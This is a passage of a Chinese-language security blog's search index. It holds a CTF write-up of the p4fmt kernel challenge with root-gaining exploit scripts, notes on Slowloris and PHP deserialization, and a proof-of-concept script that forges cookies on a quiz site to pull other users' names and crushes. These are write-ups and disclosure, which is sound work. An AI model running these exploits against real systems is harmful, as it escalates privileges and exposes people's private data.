length , prot , 2 , mapping -> offset ); printk ( \"clear_user(addr=0x%llx, length=0x%llx) \\n \" , mapping -> load_addr , mapping -> length ); _clear_user ( mapping -> load_addr , mapping -> length ); } else { // \u9019\u88e1\u662f\u8981\u628a\u6a94\u6848\u639b\u4e0a\u53bb\uff0c\u985e\u4f3c .text \u6bb5 vm_mmap ( bprm -> file , addr , mapping -> length , prot , 2 , mapping -> offset ); } }","title":"\u9006\u5411"},{"location":"security/pwn/writeups/p4fmt/#_3","text":"mapping_count \u6539\u5927\u53ef\u4ee5 leak linux_binprm \u5176\u4ed6\u6b04\u4f4d\u7684\u503c _clear_user \u6c92\u6709\u6aa2\u67e5\uff0c\u53ef\u4ee5\u628a kernel \u4e0a\u4efb\u610f\u4f4d\u5740\u7684\u503c\u6e05\u7a7a linux_binprm \u6709\u4e00\u500b cred \u7684\u7d50\u69cb\uff0c\u88e1\u9762\u5b58\u7684\u5c31\u662f uid, gid \u6240\u4ee5\u6211\u5011\u53ea\u8981 leak \u51fa\u9019\u500b cred \u7684\u4f4d\u5740\uff0c\u7136\u5f8c\u7528 _clear_user \u6e05\u6210 0\uff0c\u6211\u5011\u7684\u7a0b\u5f0f\u5c31\u662f root \u6b0a\u9650\u4e86 ( root \u7684 uid \u662f 0 )","title":"\u6f0f\u6d1e"},{"location":"security/pwn/writeups/p4fmt/#_4","text":"#!/usr/bin/env python3 from pwn import * from base64 import b64encode context . arch = \"amd64\" payload = b \"P4\" # magic payload += p8 ( 0 ) # version payload += p8 ( 1 ) # type payload += p32 ( 1 ) # mapping_count payload += p64 ( 0x18 ) # mapping_offset payload += p64 ( 0x400030 ) # entry # mapping payload += flat ( 0x400000 | 7 , 0x1000 , 0 ) payload += asm ( shellcraft . echo ( \"test \\n \" ) + shellcraft . exit ()) print ( f 'echo {b64encode(payload).decode()} | base64 -d > a ; chmod +x a ; ./a' ) \u5148\u5beb\u500b\u7c21\u55ae\u7684 p4 \u683c\u5f0f\u7684\u57f7\u884c\u6a94\u6e2c\u8a66\u4e00\u4e0b\u6211\u5011\u7684\u7406\u89e3\u662f\u4e0d\u662f\u5c0d\u7684 command echo UDQAAQEAAAAYAAAAAAAAADAAQAAAAAAABwBAAAAAAAAAEAAAAAAAAAAAAAAAAAAASLgBAQEBAQEBAVBIuHVkcnULAQEBSDEEJGoBWGoBX2oFWkiJ5g8FajxYDwU = | base64 -d > a ; chmod +x a ; ./a output [ 50353 .170813 ] vm_mmap ( load_addr = 0x400000, length = 0x1000, offset = 0x0, prot = 7 ) test \u63a5\u4e0b\u4f86\u8981\u627e cred \u7684\u4f4d\u5740\uff0c\u56e0\u70ba pwn \u7684 uid \u662f 1000 ( = 0x3e8 ) \u6240\u4ee5\u6211\u5011\u628a\u4f7f\u7528\u8005\u5207\u63db\u6210 pwn \uff0c\u5207\u6210 pwn \u4e4b\u5f8c\u8981\u5728 /tmp \u624d\u53ef\u4ee5\u5beb\u6a94 \u7136\u5f8c\u628a mapping_count \u6539\u5927\u4e00\u9ede\uff0c\u6bd4\u5982 6 \uff0c\u5728\u4ed6\u5370\u51fa\u7684\u4f4d\u5740\u6307\u5411\u7684\u503c\u4e2d\u627e 0x3e8 [ 50800 .668734 ] vm_mmap ( load_addr = 0x400000, length = 0x1000, offset = 0x0, prot = 7 ) [ 50800 .674080 ] vm_mmap ( load_addr = 0x10101010101b000, length = 0x726475b848500101, offset = 0x431480101010b75, prot = 0 ) [ 50800 .674550 ] clear_user ( addr = 0x10101010101b848, length = 0x726475b848500101 ) [ 50800 .675372 ] vm_mmap ( load_addr = 0x6a5f016a58016000, length = 0x6a050fe689485a05, offset = 0x50f583c, prot = 4 ) [ 50800 .675786 ] vm_mmap ( load_addr = 0x0, length = 0x0, offset = 0x0, prot = 0 ) [ 50800 .676003 ] vm_mmap ( load_addr = 0x0, length = 0x7fffffffef99, offset = 0x100000001, prot = 0 ) [ 50800 .676260 ] vm_mmap ( load_addr = 0x0, length = 0xffffa1c307595b40, offset = 0x0, prot = 0 ) test \u627e\u4e86\u4e00\u627e\u767c\u73fe\u5728\u7b2c\u516d\u500b vm_mmap \u7684 0xffffa1c307595b40 \u9019\u500b\u4f4d\u5740\u662f cred \u4f46\u662f\u9019\u500b\u4f4d\u5740\u6bcf\u6b21\u8dd1\u8d77\u4f86\u90fd\u4e0d\u4e00\u6a23\uff0c\u4e0d\u904e\u591a\u8dd1\u5e7e\u6b21\u6703\u767c\u73fe\uff0c\u9019\u500b\u503c\u6703\u4e00\u76f4\u5faa\u74b0\u91cd\u8907\u5229\u7528\uff0c\u6240\u4ee5\u53ea\u8981\u591a\u8dd1\u5e7e\u6b21\u5c31\u6703\u5c0d\u4e86","title":"\u5617\u8a66"},{"location":"security/pwn/writeups/p4fmt/#final-exploit","text":"#!/usr/bin/env python3 from pwn import * from base64 import b64encode context . arch = \"amd64\" payload = b \"P4\" # magic payload += p8 ( 0 ) # version payload += p8 ( 1 ) # type payload += p32 ( 2 ) # mapping_count payload += p64 ( 0x18 ) # mapping_offset payload += p64 ( 0x400048 ) # entry leak_cred = 0xffff9855c758c0c0 # mapping payload += flat ( 0x400000 | 7 , 0x1000 , 0 , ( leak_cred | 8 ) + 0x10 , 0x20 , 0 ) payload += asm ( shellcraft . cat ( \"/flag\" ) + shellcraft . exit ()) print ( f 'echo {b64encode(payload).decode()} | base64 -d > a ; chmod +x a ; ./a' ) https://github.com/david942j/ctf-writeups/tree/master/teaser-confidence-quals-2019/p4fmt \u21a9 https://devcraft.io/2019/03/19/p4fmt-confidence-ctf-2019-teaser.html \u21a9 https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/ \u21a9","title":"Final Exploit"},{"location":"security/web/ddos/","text":"DDOS Slow Loris Attack https://www.youtube.com/watch?v=XiFkyR35v2Y https://github.com/gkbrk/slowloris \u5efa\u7acb\u8a31\u591a\u9023\u7dda \u4f46\u662f\u6bcf\u500b\u9023\u7dda\u90fd\u5f88\u6162\uff0c\u7b49\u5230\u5feb\u8981 timeout \u518d\u50b3\u4e00\u500b byte","title":"DDOS"},{"location":"security/web/ddos/#ddos","text":"","title":"DDOS"},{"location":"security/web/ddos/#slow-loris-attack","text":"https://www.youtube.com/watch?v=XiFkyR35v2Y https://github.com/gkbrk/slowloris \u5efa\u7acb\u8a31\u591a\u9023\u7dda \u4f46\u662f\u6bcf\u500b\u9023\u7dda\u90fd\u5f88\u6162\uff0c\u7b49\u5230\u5feb\u8981 timeout \u518d\u50b3\u4e00\u500b byte","title":"Slow Loris Attack"},{"location":"security/web/information-gathering/","text":"Information Gathering dirb : \u6383\u76ee\u9304 nikto : \u5f31\u6383\u5de5\u5177","title":"Information Gathering"},{"location":"security/web/information-gathering/#information-gathering","text":"dirb : \u6383\u76ee\u9304 nikto : \u5f31\u6383\u5de5\u5177","title":"Information Gathering"},{"location":"security/web/php/","text":"Tricks in PHP https://www.restran.net/2016/09/26/php-security-notes/ serialize \u76f8\u95dc\u90e8\u843d\u683c\u6587\u7ae0 __wakeup unserialize() \u6703\u6aa2\u67e5\u662f\u5426\u5b58\u5728\u4e00\u500b __wakeup() \u65b9\u6cd5 \u5982\u679c\u5b58\u5728\uff0c\u5247\u6703\u5148\u8abf\u7528 __wakeup \u65b9\u6cd5\uff0c\u9810\u5148\u6e96\u5099\u5c0d\u8c61\u9700\u8981\u7684\u8cc7\u6e90 protected and private variable <?php class starwars { public $jedi1 = \"master1\" ; protected $jedi2 = \"master2\" ; private $jedi3 = \"master3\" ; } $s = new starwars (); echo serialize ( $s ); // output : 'O:8:\"starwars\":3:{s:5:\"jedi1\";s:7:\"master1\";s:8:\"*jedi2\";s:7:\"master2\";s:15:\"starwarsjedi3\";s:7:\"master3\";}' ?> \u6703\u767c\u73fe\u9577\u5ea6\u602a\u602a\u7684 protected variable \u7684 s:8:\"*jedi2\"; \u5176\u5be6\u662f s:8:\"\\x00*\\x00jedi2\"; private variable \u7684 s:15:\"starwarsjedi3\"; \u5176\u5be6\u662f s:15:\"\\x00starwars\\x00jedi3\"; \u6578\u5b57\u524d\u9762\u53ef\u4ee5\u6709 + \u6578\u5b57\u7684\u524d\u9762\u90fd\u53ef\u4ee5\u6709 + \u4ee3\u8868\u6b63\u6578 CVE-2016-7124 \u5f71\u97ff\u7248\u672c : PHP5 < 5.6.25 PHP7 < 7.0.10 \u5728\u6210\u54e1\u5c6c\u6027\u6578\u76ee\u5927\u65bc\u5be6\u969b\u6578\u76ee\u6642\uff0c__wakeup \u4e0d\u6703\u88ab\u547c\u53eb \u5c31\u50cf\u9019\u6a23 'O:4:\"test\":10:{s:7:\"message\";s:5:\"hello\";}' \uff0c\u6211\u53ea\u6709\u4e00\u500b\u5c6c\u6027 message \u4f46\u6211\u662f\u586b 10","title":"Tricks in PHP"},{"location":"security/web/php/#tricks-in-php","text":"https://www.restran.net/2016/09/26/php-security-notes/","title":"Tricks in PHP"},{"location":"security/web/php/#serialize","text":"\u76f8\u95dc\u90e8\u843d\u683c\u6587\u7ae0","title":"serialize"},{"location":"security/web/php/#9595wakeup","text":"unserialize() \u6703\u6aa2\u67e5\u662f\u5426\u5b58\u5728\u4e00\u500b __wakeup() \u65b9\u6cd5 \u5982\u679c\u5b58\u5728\uff0c\u5247\u6703\u5148\u8abf\u7528 __wakeup \u65b9\u6cd5\uff0c\u9810\u5148\u6e96\u5099\u5c0d\u8c61\u9700\u8981\u7684\u8cc7\u6e90","title":"__wakeup"},{"location":"security/web/php/#protected-and-private-variable","text":"<?php class starwars { public $jedi1 = \"master1\" ; protected $jedi2 = \"master2\" ; private $jedi3 = \"master3\" ; } $s = new starwars (); echo serialize ( $s ); // output : 'O:8:\"starwars\":3:{s:5:\"jedi1\";s:7:\"master1\";s:8:\"*jedi2\";s:7:\"master2\";s:15:\"starwarsjedi3\";s:7:\"master3\";}' ?> \u6703\u767c\u73fe\u9577\u5ea6\u602a\u602a\u7684 protected variable \u7684 s:8:\"*jedi2\"; \u5176\u5be6\u662f s:8:\"\\x00*\\x00jedi2\"; private variable \u7684 s:15:\"starwarsjedi3\"; \u5176\u5be6\u662f s:15:\"\\x00starwars\\x00jedi3\";","title":"protected and private variable"},{"location":"security/web/php/#_1","text":"\u6578\u5b57\u7684\u524d\u9762\u90fd\u53ef\u4ee5\u6709 + \u4ee3\u8868\u6b63\u6578","title":"\u6578\u5b57\u524d\u9762\u53ef\u4ee5\u6709 +"},{"location":"security/web/php/#cve-2016-7124","text":"\u5f71\u97ff\u7248\u672c : PHP5 < 5.6.25 PHP7 < 7.0.10 \u5728\u6210\u54e1\u5c6c\u6027\u6578\u76ee\u5927\u65bc\u5be6\u969b\u6578\u76ee\u6642\uff0c__wakeup \u4e0d\u6703\u88ab\u547c\u53eb \u5c31\u50cf\u9019\u6a23 'O:4:\"test\":10:{s:7:\"message\";s:5:\"hello\";}' \uff0c\u6211\u53ea\u6709\u4e00\u500b\u5c6c\u6027 message \u4f46\u6211\u662f\u586b 10","title":"CVE-2016-7124"},{"location":"security/web/sql-injection/","text":"","title":"SQL injection"},{"location":"security/web/xss/","text":"","title":"XSS"},{"location":"topics/elasticdump-error/","text":"elasticdump - es_rejected_execution_exception error \u5728\u6211\u7528 elasticdump \u628a\u8cc7\u6599\u4e1f\u9032 Kibana \u7684\u6642\u5019\u767c\u751f\u4e86 es_rejected_execution_exception \u9019\u500b\u932f\u8aa4 \u4e0a\u7db2\u67e5\u767c\u73fe\u662f queue \u585e\u6eff\u4e86\uff0c\u4f46\u6211\u4e0d\u77e5\u9053\u600e\u9ebc\u628a queue \u8abf\u9ad8\u4e00\u9ede \u770b\u4e86\u770b elasticdump \u7684 help \u9801\u9762\uff0c\u767c\u73fe\u4e86 --maxSockets \u9019\u500b\u9078\u9805\uff0c\u9810\u8a2d\u662f 5 --maxSockets How many simultaneous HTTP requests can we process make? (default: 5 [node <= v0.10.x] / Infinity [node >= v0.11.x] ) \u628a\u5b83\u8abf\u6210 1\uff0c\u4ed6\u5c31\u4e0d\u6703\u767c\u90a3\u9ebc\u5feb\u628a queue \u585e\u7206\u5566 elasticdump --output = \"http://localhost:9200/my_index\" --input = ./index.json --type = data --maxSockets 1","title":"elasticdump - es_rejected_execution_exception error"},{"location":"topics/elasticdump-error/#elasticdump-es_rejected_execution_exception-error","text":"\u5728\u6211\u7528 elasticdump \u628a\u8cc7\u6599\u4e1f\u9032 Kibana \u7684\u6642\u5019\u767c\u751f\u4e86 es_rejected_execution_exception \u9019\u500b\u932f\u8aa4 \u4e0a\u7db2\u67e5\u767c\u73fe\u662f queue \u585e\u6eff\u4e86\uff0c\u4f46\u6211\u4e0d\u77e5\u9053\u600e\u9ebc\u628a queue \u8abf\u9ad8\u4e00\u9ede \u770b\u4e86\u770b elasticdump \u7684 help \u9801\u9762\uff0c\u767c\u73fe\u4e86 --maxSockets \u9019\u500b\u9078\u9805\uff0c\u9810\u8a2d\u662f 5 --maxSockets How many simultaneous HTTP requests can we process make? (default: 5 [node <= v0.10.x] / Infinity [node >= v0.11.x] ) \u628a\u5b83\u8abf\u6210 1\uff0c\u4ed6\u5c31\u4e0d\u6703\u767c\u90a3\u9ebc\u5feb\u628a queue \u585e\u7206\u5566 elasticdump --output = \"http://localhost:9200/my_index\" --input = ./index.json --type = data --maxSockets 1","title":"elasticdump - es_rejected_execution_exception error"},{"location":"topics/lovemeter/","text":"\u8cc7\u5b89\u5c0f\u6545\u4e8b - \u9905\u4e7e\u731c\u731c\u6a02 \u4e8b\u60c5\u662f\u9019\u6a23\u7684\uff0c\u6211\u5728\u5225\u4eba\u7684\u6328\u5c45\u7684\u81ea\u4ecb\u4e0a\u9762\u770b\u5230\u4e00\u500b\u9023\u7d50\uff0c\u5c31\u597d\u5947\u7684\u9ede\u4e86\u9032\u53bb \u88e1\u9762\u770b\u8d77\u4f86\u5c31\u662f\u90a3\u7a2e\u5fc3\u88e1\u6e2c\u9a57\u7684\u7db2\u7ad9\uff0c\u611b\u60c5\u8a08\u7b97\u5668\uff0c\u5e6b\u4f60\u6e2c\u4f60\u548c\u559c\u6b61\u7684\u4eba\u914d\u4e0d\u914d \u8070\u660e\u5982\u6211 \u8cc7\u5b89\u5c0f\u5929\u624d \uff0c\u7576\u7136\u662f\u96a8\u4fbf\u4e82\u6253\u500b abcd \u5c31\u9001\u51fa\u770b\u770b\u9019\u662f\u5728\u800d\u4ec0\u9ebc\u82b1\u6a23 \u679c\u7136\u662f\u611a\u5f04\u4eba\u7684\u7db2\u7ad9\uff0c\u5982\u679c\u4f60\u8aa0\u5be6\u7684\u586b\u4e0a\u4f60\u7684\u540d\u5b57\u548c\u4f60\u559c\u6b61\u7684\u4eba\u7684\u540d\u5b57\uff0c\u5c31\u88ab\u5206\u4eab\u7d66\u4f60\u9023\u7d50\u7684\u4eba\u770b\u5149\u5149\u5566 \u5728\u4f60\u751f\u6c23\u7684\u540c\u6642\uff0c\u9019\u500b\u7db2\u7ad9\u5c31\u5f88\u597d\u5fc3\u7684\u8b93\u4f60\u8a3b\u518a\u4e00\u4e0b\u597d\u767c\u6d29\u6028\u6c23 \u90a3\u6211\u7576\u7136\u4e5f\u9806\u624b\u6309\u4e86\u4e00\u4e0b\u8a3b\u518a\uff08\u514d\u9322\u7684\u96a8\u624b\u6309\u4e00\u4e0b\uff09\uff0c\u9019\u6642\u5019\u5c31\u53ef\u4ee5\u628a\u9023\u7d50\u5206\u4eab\u7d66\u5225\u4eba\u56c9 \u9019\u500b\u53ef\u4ee5\u770b\u4e2d\u4e86\u6211\u7684\u5708\u5957\u7684\u53d7\u5bb3\u8005\u540d\u55ae\u7684\u9801\u9762\uff0c\u6211\u53ea\u8981\u628a cookie \u6e05\u6389\uff0c\u5c31\u6703\u88ab\u5e36\u5230\u524d\u9762\u7b2c\u4e00\u500b\u611b\u60c5\u8a08\u7b97\u5668\uff08\u9677\u9631\uff09\u9801\u9762\uff0c\u4ee3\u8868\u4ed6\u6709\u7528 cookie \u53bb\u9a57\u8b49\u4f60\u662f\u8ab0 \u6709\u5c0d\u7684 cookie \u4ed6\u6703\u7d66\u6211\u53d7\u5bb3\u8005\u540d\u55ae \u4e0d\u5c0d\u7684 cookie \u4ed6\u6703\u8b93\u6211\u6389\u9032\u9677\u9631 \u90a3\u5728\u770b\u770b\u4ed6\u7684 cookie \u4e4b\u524d\u773c\u5c16\u7684\u6211\uff0c\u5c31\u767c\u73fe\u4ed6\u7684 url \u6709\u4e9b\u5730\u65b9\u50cf\u50cf\u7684\uff0c\u800c\u4e14\u5f8c\u9762\u7684 userid \u5f88\u77ed https://cn.lovemeter.me/user/5S1X https://cn.lovemeter.me/user/5S1Y https://cn.lovemeter.me/user/5S1Z \u591a\u8a3b\u518a\u5e7e\u6b21\u6703\u767c\u73fe\uff0c\u4ed6\u7684 userid \u600e\u9ebc\u611f\u89ba\u597d\u50cf\u662f\u6bcf\u6b21 counter++ \u518d\u591a\u5617\u8a66\u5e7e\u6b21\uff0c\u5c31\u6703\u767c\u73fe userid \u7684\u5b57\u5143\u53ea\u6703\u662f 0-9a-zA-Z \u7684\u5b57\u5143\u7d44\u6210 \u7136\u5f8c\u91cd\u9ede\u662f\u4ed6\u7684 cookie \u662f\u500b\u6578\u5b57\uff0c\u800c\u4e14\u5b8c\u5b8c\u5168\u5168\u662f counter++ \u7684\u6a23\u5b50 user_quiz_1399337=1399337 user_quiz_1399337=1399338 user_quiz_1399337=1399339 \u90a3\u9019\u500b userid \u8ddf\u9019\u500b cookie \u7684 id \u7684\u5c0d\u7167\u662f\u600e\u9ebc\u6a23\u7684\u5462 \u731c\u4e00\u731c\u5c31\u80fd\u767c\u73fe\u4ed6\u5176\u5be6\u662f\u628a 0-9a-zA-Z \u7576\u6210 0-61 \u7684 62 \u9032\u4f4d\uff08\u5f88\u5408\u7406\u5427\uff09 convert ( '5S1X' ) = 5 * ( 62 ** 3 ) + 54 * ( 62 ** 2 ) + 1 * ( 62 ** 1 ) + 59 * ( 62 ** 0 ) = 1399337 \u90a3\u6211\u5011\u53ea\u8981\u628a\u4ed6\u7684 userid \u8f49\u56de\u6578\u5b57\uff0c\u4e26\u65b0\u589e\u500b cookie\uff0c\u5c31\u80fd\u6210\u529f\u770b\u5230\u5225\u4eba\u7684\u53d7\u5bb3\u8005\u540d\u55ae\u56c9 Proof Of Concept ( POC ) source #!/usr/bin/env python3 import re import sys import json import string from prettytable import PrettyTable import requests if len ( sys . argv ) < 2 : print ( 'usage: ./lovemeter.py (url)' ) exit ( 0 ) value = string . digits + string . ascii_letters def uid2num ( uid ): num = 0 for ch in uid : v = value . index ( ch ) num = num * len ( value ) + v return num def num2uid ( num ): uid = '' while num > 0 : v = num % len ( value ) uid += value [ v ] num //= len ( value ) return uid [:: - 1 ] url = sys . argv [ 1 ] r = re . search ( 'https:\\/\\/(\\w+)\\.lovemeter.me\\/\\w+\\/(\\w+)' , url ) prefix = r . group ( 1 ) uid = r . group ( 2 ) num = uid2num ( uid ) r = requests . get ( f 'https://{prefix}.lovemeter.me/other-user-stats/{uid}' , headers = { 'cookie' : f 'user_quiz_{num}={num}' , 'user-agent' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1' }) data = json . loads ( r . text )[ 'data' ] t = PrettyTable ([ '\u540d\u5b57' , '\u559c\u6b61\u7684\u4eba' ]) for item in data : item = json . loads ( item ) t . add_row ([ item [ 'userFullName' ], item [ 'crushFullName' ]]) print ( t ) usage ./lovemeter.py https://cn.lovemeter.me/user/1234","title":"\u8cc7\u5b89\u5c0f\u6545\u4e8b - \u9905\u4e7e\u731c\u731c\u6a02"},{"location":"topics/lovemeter/#-","text":"\u4e8b\u60c5\u662f\u9019\u6a23\u7684\uff0c\u6211\u5728\u5225\u4eba\u7684\u6328\u5c45\u7684\u81ea\u4ecb\u4e0a\u9762\u770b\u5230\u4e00\u500b\u9023\u7d50\uff0c\u5c31\u597d\u5947\u7684\u9ede\u4e86\u9032\u53bb \u88e1\u9762\u770b\u8d77\u4f86\u5c31\u662f\u90a3\u7a2e\u5fc3\u88e1\u6e2c\u9a57\u7684\u7db2\u7ad9\uff0c\u611b\u60c5\u8a08\u7b97\u5668\uff0c\u5e6b\u4f60\u6e2c\u4f60\u548c\u559c\u6b61\u7684\u4eba\u914d\u4e0d\u914d \u8070\u660e\u5982\u6211 \u8cc7\u5b89\u5c0f\u5929\u624d \uff0c\u7576\u7136\u662f\u96a8\u4fbf\u4e82\u6253\u500b abcd \u5c31\u9001\u51fa\u770b\u770b\u9019\u662f\u5728\u800d\u4ec0\u9ebc\u82b1\u6a23 \u679c\u7136\u662f\u611a\u5f04\u4eba\u7684\u7db2\u7ad9\uff0c\u5982\u679c\u4f60\u8aa0\u5be6\u7684\u586b\u4e0a\u4f60\u7684\u540d\u5b57\u548c\u4f60\u559c\u6b61\u7684\u4eba\u7684\u540d\u5b57\uff0c\u5c31\u88ab\u5206\u4eab\u7d66\u4f60\u9023\u7d50\u7684\u4eba\u770b\u5149\u5149\u5566 \u5728\u4f60\u751f\u6c23\u7684\u540c\u6642\uff0c\u9019\u500b\u7db2\u7ad9\u5c31\u5f88\u597d\u5fc3\u7684\u8b93\u4f60\u8a3b\u518a\u4e00\u4e0b\u597d\u767c\u6d29\u6028\u6c23 \u90a3\u6211\u7576\u7136\u4e5f\u9806\u624b\u6309\u4e86\u4e00\u4e0b\u8a3b\u518a\uff08\u514d\u9322\u7684\u96a8\u624b\u6309\u4e00\u4e0b\uff09\uff0c\u9019\u6642\u5019\u5c31\u53ef\u4ee5\u628a\u9023\u7d50\u5206\u4eab\u7d66\u5225\u4eba\u56c9 \u9019\u500b\u53ef\u4ee5\u770b\u4e2d\u4e86\u6211\u7684\u5708\u5957\u7684\u53d7\u5bb3\u8005\u540d\u55ae\u7684\u9801\u9762\uff0c\u6211\u53ea\u8981\u628a cookie \u6e05\u6389\uff0c\u5c31\u6703\u88ab\u5e36\u5230\u524d\u9762\u7b2c\u4e00\u500b\u611b\u60c5\u8a08\u7b97\u5668\uff08\u9677\u9631\uff09\u9801\u9762\uff0c\u4ee3\u8868\u4ed6\u6709\u7528 cookie \u53bb\u9a57\u8b49\u4f60\u662f\u8ab0 \u6709\u5c0d\u7684 cookie \u4ed6\u6703\u7d66\u6211\u53d7\u5bb3\u8005\u540d\u55ae \u4e0d\u5c0d\u7684 cookie \u4ed6\u6703\u8b93\u6211\u6389\u9032\u9677\u9631 \u90a3\u5728\u770b\u770b\u4ed6\u7684 cookie \u4e4b\u524d\u773c\u5c16\u7684\u6211\uff0c\u5c31\u767c\u73fe\u4ed6\u7684 url \u6709\u4e9b\u5730\u65b9\u50cf\u50cf\u7684\uff0c\u800c\u4e14\u5f8c\u9762\u7684 userid \u5f88\u77ed https://cn.lovemeter.me/user/5S1X https://cn.lovemeter.me/user/5S1Y https://cn.lovemeter.me/user/5S1Z \u591a\u8a3b\u518a\u5e7e\u6b21\u6703\u767c\u73fe\uff0c\u4ed6\u7684 userid \u600e\u9ebc\u611f\u89ba\u597d\u50cf\u662f\u6bcf\u6b21 counter++ \u518d\u591a\u5617\u8a66\u5e7e\u6b21\uff0c\u5c31\u6703\u767c\u73fe userid \u7684\u5b57\u5143\u53ea\u6703\u662f 0-9a-zA-Z \u7684\u5b57\u5143\u7d44\u6210 \u7136\u5f8c\u91cd\u9ede\u662f\u4ed6\u7684 cookie \u662f\u500b\u6578\u5b57\uff0c\u800c\u4e14\u5b8c\u5b8c\u5168\u5168\u662f counter++ \u7684\u6a23\u5b50 user_quiz_1399337=1399337 user_quiz_1399337=1399338 user_quiz_1399337=1399339 \u90a3\u9019\u500b userid \u8ddf\u9019\u500b cookie \u7684 id \u7684\u5c0d\u7167\u662f\u600e\u9ebc\u6a23\u7684\u5462 \u731c\u4e00\u731c\u5c31\u80fd\u767c\u73fe\u4ed6\u5176\u5be6\u662f\u628a 0-9a-zA-Z \u7576\u6210 0-61 \u7684 62 \u9032\u4f4d\uff08\u5f88\u5408\u7406\u5427\uff09 convert ( '5S1X' ) = 5 * ( 62 ** 3 ) + 54 * ( 62 ** 2 ) + 1 * ( 62 ** 1 ) + 59 * ( 62 ** 0 ) = 1399337 \u90a3\u6211\u5011\u53ea\u8981\u628a\u4ed6\u7684 userid \u8f49\u56de\u6578\u5b57\uff0c\u4e26\u65b0\u589e\u500b cookie\uff0c\u5c31\u80fd\u6210\u529f\u770b\u5230\u5225\u4eba\u7684\u53d7\u5bb3\u8005\u540d\u55ae\u56c9","title":"\u8cc7\u5b89\u5c0f\u6545\u4e8b - \u9905\u4e7e\u731c\u731c\u6a02"},{"location":"topics/lovemeter/#proof-of-concept-poc","text":"source #!/usr/bin/env python3 import re import sys import json import string from prettytable import PrettyTable import requests if len ( sys . argv ) < 2 : print ( 'usage: ./lovemeter.py (url)' ) exit ( 0 ) value = string . digits + string . ascii_letters def uid2num ( uid ): num = 0 for ch in uid : v = value . index ( ch ) num = num * len ( value ) + v return num def num2uid ( num ): uid = '' while num > 0 : v = num % len ( value ) uid += value [ v ] num //= len ( value ) return uid [:: - 1 ] url = sys . argv [ 1 ] r = re . search ( 'https:\\/\\/(\\w+)\\.lovemeter.me\\/\\w+\\/(\\w+)' , url ) prefix = r . group ( 1 ) uid = r . group ( 2 ) num = uid2num ( uid ) r = requests . get ( f 'https://{prefix}.lovemeter.me/other-user-stats/{uid}' , headers = { 'cookie' : f 'user_quiz_{num}={num}' , 'user-agent' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1' }) data = json . loads ( r . text )[ 'data' ] t = PrettyTable ([ '\u540d\u5b57' , '\u559c\u6b61\u7684\u4eba' ]) for item in data : item = json . loads ( item ) t . add_row ([ item [ 'userFullName' ], item [ 'crushFullName' ]]) print ( t ) usage ./lovemeter.py https://cn.lovemeter.me/user/1234","title":"Proof Of Concept ( POC )"},{"location":"topics/mkdocs-extensions/","text":"\u90e8\u843d\u683c\u7dad\u8b77\u65e5\u8a18 - mkdocs extensions mkdocs \u662f\u7528 Python-Markdown \u9019\u500b python package \u53bb\u628a markdown \u6e32\u67d3\u6210 html \u6240\u4ee5\u5728 mkdocs.yml \u4e2d\u8a2d\u5b9a\u7684 markdown_extensions \u5176\u5be6\u5c31\u662f Python-Markdown \u7684 extensions \u9664\u4e86 Python-Markdown \u5b98\u65b9\u9810\u8a2d\u7684 extension \u4e4b\u5916\uff0c\u9084\u53ef\u4ee5\u7528 pymdown-extensions \u5b89\u88dd pymdown-extensions \u8981\u5b89\u88dd\u9019\u500b python packages \u5f88\u7c21\u55ae\uff0c\u8ddf\u4e00\u822c\u7684 python package \u6c92\u5169\u6a23 pip install pymdown-extensions \u4f46\u662f\u554f\u984c\u662f\uff0cmkdocs \u5230\u5e95\u662f\u600e\u9ebc\u77e5\u9053 pymdown-extensions \u5728\u54ea\u88e1\u7684\uff0c\u4ed6\u600e\u9ebc\u8f09\u5165\u7684? mkdocs/nav.py#L291 ( mkdocs==0.17.2 ) 291 292 293 294 295 md = markdown . Markdown ( extensions = extensions , extension_configs = config [ 'mdx_configs' ] or {} ) self . content = md . convert ( self . markdown ) \u53ef\u4ee5\u770b\u5230\u4ed6\u662f\u53bb\u5275\u5efa\u4e00\u500b Markdown \u7269\u4ef6\uff0c\u7136\u5f8c\u518d\u7528 convert \u800c\u9019\u908a\u7684 extensions \u5c31\u662f ['pymdownx.arithmatex', 'pymdownx.caret', ...] \u90a3\u6240\u4ee5 Python-Markdown \u662f\u600e\u9ebc\u7528\u9019\u4e9b\u5b57\u4e32\u53bb\u627e\u6211\u5011\u5b89\u88dd\u7684 extensions \u5462? markdown/core.py#L162 ( Markdown==3.0.1 ) 162 163 164 165 166 167 168 169 # Get class name (if provided): `path.to.module:ClassName` ext_name , class_name = ext_name . split ( ':' , 1 ) if ':' in ext_name else ( ext_name , '' ) try : module = importlib . import_module ( ext_name ) logger . debug ( 'Successfuly imported extension module \" %s \".' % ext_name ) \u53ef\u4ee5\u770b\u5230\u4ed6\u662f\u76f4\u63a5\u53bb import \u6211\u5011\u7d66\u7684\u5b57\u4e32\uff0c\u6240\u4ee5\u53ea\u8981 pip install \u6709\u88dd\u597d\u53ef\u4ee5 import \u5c31\u53ef\u4ee5\u4e86 \u8ffd\u5b8c source code \u4e4b\u5f8c\u624d\u770b\u61c2\u4ed6\u7684 document \u4e0a\u9762\u5beb\u7684\u662f\u4ec0\u9ebc\u610f\u601d... markdown.markdown(some_text, extensions=[MyExtClass(), 'myext', 'path.to.my.ext:MyExtClass']) path.to.my.ext \u5c31\u662f\u8981 import \u7684 module MyExtClass \u5982\u679c\u6709\u7d66\u5c31\u76f4\u63a5\u7528\u6307\u5b9a\u7684 Class\uff0c\u6c92\u6709\u7684\u8a71\u6703\u53bb\u7528 makeExtension() \u7684\u56de\u50b3\u503c \u7d50\u8ad6\u662f\uff0c\u53ea\u8981 pip install \u5b8c\u5c31\u6c92\u4e8b\u4e86xD","title":"\u90e8\u843d\u683c\u7dad\u8b77\u65e5\u8a18 - mkdocs extensions"},{"location":"topics/mkdocs-extensions/#-mkdocs-extensions","text":"mkdocs \u662f\u7528 Python-Markdown \u9019\u500b python package \u53bb\u628a markdown \u6e32\u67d3\u6210 html \u6240\u4ee5\u5728 mkdocs.yml \u4e2d\u8a2d\u5b9a\u7684 markdown_extensions \u5176\u5be6\u5c31\u662f Python-Markdown \u7684 extensions \u9664\u4e86 Python-Markdown \u5b98\u65b9\u9810\u8a2d\u7684 extension 